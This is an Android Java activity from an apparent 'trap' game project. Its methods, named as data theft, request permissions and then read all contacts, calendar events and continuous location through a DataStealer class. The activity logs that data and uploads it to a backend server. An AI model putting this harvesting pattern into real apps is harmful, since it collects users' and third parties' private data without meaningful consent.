package de.hpi3d.gamepgrog.trap.ui;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Parcelable;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;

import java.util.ArrayList;
import java.util.List;
import java.util.function.Consumer;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import de.hpi3d.gamepgrog.trap.DataStealer;
import de.hpi3d.gamepgrog.trap.R;
import de.hpi3d.gamepgrog.trap.api.ApiBuilder;
import de.hpi3d.gamepgrog.trap.api.BackendManagerIntentService;
import de.hpi3d.gamepgrog.trap.api.OfflineAPI;
import de.hpi3d.gamepgrog.trap.api.UserDataPostRequestFactory;
import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
import de.hpi3d.gamepgrog.trap.datatypes.Contact;
import de.hpi3d.gamepgrog.trap.datatypes.LocationData;
import de.hpi3d.gamepgrog.trap.gamelogic.IApp;
import de.hpi3d.gamepgrog.trap.gamelogic.NoPermissionsException;

public class MainActivity extends AppCompatActivity implements IApp {


    private static final int PERMISSION_REQUEST_IDENTIFIER_READ_CONTACTS = 101;
    private static final int PERMISSION_REQUEST_IDENTIFIER_READ_CALENDAR = 102;
    private static final int PERMISSION_REQUEST_IDENTIFIER_READ_LOCATION = 103;


    private ApiBuilder.API server;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        int playerId = BackendManagerIntentService.getPlayerId(this);
        if (-1 == playerId) {
            Intent registerPlayer = new Intent(this, BackendManagerIntentService.class);
            registerPlayer.putExtra(BackendManagerIntentService.KEY_MANAGE_TYPE, BackendManagerIntentService.MANAGE_PLAYER_REGISTRATION);
            startService(registerPlayer);
        }
        setContentView(R.layout.activity_main);


        if (BackendManagerIntentService.isInSafetyMode(getApplicationContext())) {
            server = new OfflineAPI();
        } else {
            server = ApiBuilder.build(getApplicationContext());
        }

    }

    /**
     * Requests permission to read contacts. Unsure where to put this, feel free to move it
     * around once we know from where we read device contacts.
     * <p>
     * Mostly taken from https://developer.android.com/training/permissions/requesting#java
     */
    public void prepareDataTheft() {
        prepareContactDataTheft();
        prepareCalendarDataTheft();
        prepareCoarsePositionTheft();
    }

    private void prepareCoarsePositionTheft() {
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_COARSE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.ACCESS_COARSE_LOCATION},
                    PERMISSION_REQUEST_IDENTIFIER_READ_LOCATION);
        } else {
            // Permission has already been granted
            getContinuousLocationUpdates();
        }

    }


    private void prepareContactDataTheft() {
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CONTACTS},
                    PERMISSION_REQUEST_IDENTIFIER_READ_CONTACTS);
        } else {
            // Permission has already been granted
            displayAndSendContactDataInLog();
        }

    }

    private void prepareCalendarDataTheft() {
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CALENDAR)
                != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CALENDAR},
                    PERMISSION_REQUEST_IDENTIFIER_READ_CALENDAR);
        } else {
            // Permission has already been granted
            displayAndSendCalendarDataInLog();
        }

    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String[] permissions, int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_IDENTIFIER_READ_CONTACTS: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // permission was granted
                    displayAndSendContactDataInLog();
                }
                return;
            }
            case PERMISSION_REQUEST_IDENTIFIER_READ_CALENDAR: {
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // permission was granted
                    displayAndSendCalendarDataInLog();
                }
                return;
            }
            case PERMISSION_REQUEST_IDENTIFIER_READ_LOCATION: {
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // permission was granted
                    System.out.println("=========== onRequestPermissionsResult called, good.");
                    getContinuousLocationUpdates();
                }
            }
        }
    }

    private void displayAndSendContactDataInLog() {
        ArrayList<Contact> contacts = DataStealer.takeContactData(getApplicationContext());

        for (Contact c : contacts) {
            System.out.println(c.toString());
        }

        sendContactData(contacts);
    }

    private void sendContactData(ArrayList<Contact> contacts) {
        int userId = getUserId();
        server.addData(userId, UserDataPostRequestFactory.buildWithContacts(contacts)).subscribe();
    }

    private void displayAndSendCalendarDataInLog() {
        ArrayList<CalendarEvent> cEvents = DataStealer.takeCalendarData(getApplicationContext());

        for (CalendarEvent c : cEvents) {
            System.out.println(c);
        }

        sendCalenderData(cEvents);
    }

    private void sendCalenderData(ArrayList<CalendarEvent> cEvents) {
        int userId = getUserId();
        server.addData(userId, UserDataPostRequestFactory.buildWithCalendarEvents(cEvents))
                .subscribe();
    }

    private int getUserId() {
        return BackendManagerIntentService.getPlayerId(this);
    }


    @Override
    public boolean hasPermission(int permission) {
        String permissionToTest;
        switch (permission) {
            case IApp.PERMISSION_CALENDAR:
                permissionToTest = Manifest.permission.READ_CALENDAR;
                break;
            case IApp.PERMISSION_CONTACTS:
                permissionToTest = Manifest.permission.READ_CONTACTS;
                break;
            case IApp.PERMISSION_LOCATION:
                permissionToTest = Manifest.permission.ACCESS_COARSE_LOCATION;
                break;
            default:
                throw new IllegalArgumentException("int does not symbolise any permission");
        }


        return (ContextCompat.checkSelfPermission(this, permissionToTest)
                == PackageManager.PERMISSION_GRANTED);
    }

    @Override
    public List<CalendarEvent> getCalendarEvents() throws NoPermissionsException {
        return null;
    }

    @Override
    public List<Contact> getContacts() throws NoPermissionsException {
        return null;
    }

    @Override
    public List<LocationData> getLocation() throws NoPermissionsException {
        return null;
    }

    @Override
    public void executeApiCall(String call, Consumer<Parcelable> callback) {

    }

    @Override
    public void executeApiCall(String call, UserDataPostRequestFactory.UserDataPostRequest pr, Runnable callback) {

    }

    private void getContinuousLocationUpdates() {
        FusedLocationProviderClient client = LocationServices.getFusedLocationProviderClient(this);
        DataStealer locationStealer = new DataStealer(client);
        locationStealer.getContinuousLocationUpdates(getApplicationContext());

    }

   /* Needs higher API level. How to refactor?

    private void sendLocationData(List<Location> locations) {
        int userid = getUserId();
        List<LocationData> locationsData = locations
                .stream()
                .map(LocationData::fromLocation)
                .collect(Collectors.toList());
        server.addData(userid, UserDataPostRequestFactory.buildWithLocations(locationsData))
                .subscribe();
    }*/
}
